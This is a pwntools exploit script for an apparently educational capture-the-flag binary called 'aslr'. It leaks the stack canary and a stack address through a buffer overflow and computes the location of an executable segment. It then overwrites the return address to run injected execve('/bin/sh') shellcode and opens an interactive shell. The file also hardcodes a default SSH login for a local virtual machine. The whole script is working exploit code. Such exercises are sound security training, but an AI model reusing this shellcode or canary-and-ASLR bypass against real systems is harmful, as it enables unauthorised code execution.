from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2012
PROG = "./aslr"
LOCAL_PORT = 4000
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""

    """)
    input("wait for gdb")
elif args.LOCAL:
    r = remote("localhost", LOCAL_PORT)
elif args.SSH:
    ssh = ssh("ubuntu","192.168.239.131", password="ubuntu")
    ssh.process(PROG)
else:
    r = process(PROG)
input("Starting.....")

r.recvuntil("Welcome to Leakers!\n")
r.recvuntil("\n")

nop_sled = b"\x90"*20
shellcode = b"\x48\x31\xC0\x66\xB8\x3B\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05\x90"

payload = shellcode.rjust(99,b"\x90")
input("send shellcode")
r.send(payload)

# print(r.recv(130))
# payload = b"A"*105
payload = b"A"*105

input("Send leaking string")
r.send(payload)

canary = r.recv(185)[-7:] #empirically found lol
print("The canary is ", hex(u64(canary+b"\x00")), "\b The len is....", len(canary))


input("sending new leak")
# r.send(b"A"*104 + b"\x90"+ canary + b"Z"*49)
r.send(b"A"*104 + b"\x90"+ canary + b"Z"*63)

leak_address = r.recv(300)[-6:]
leak_address += b"\x00\x00"

guess_stack = u64(leak_address)+0x200633+231-346
print("leak", leak_address)
print("Vanilla leak", hex(u64(leak_address)))
print("computed position of the RWX segment", hex(guess_stack))
# print("leak -0x70", leak_address)

payload = b"A"*104
payload += b"\x00"
payload += canary
payload += b"Z"*8
payload += p64(guess_stack)

input("Sending shellcode + canary")
r.send(payload)


input("Sending ENTER")
r.send("\n")
r.interactive()
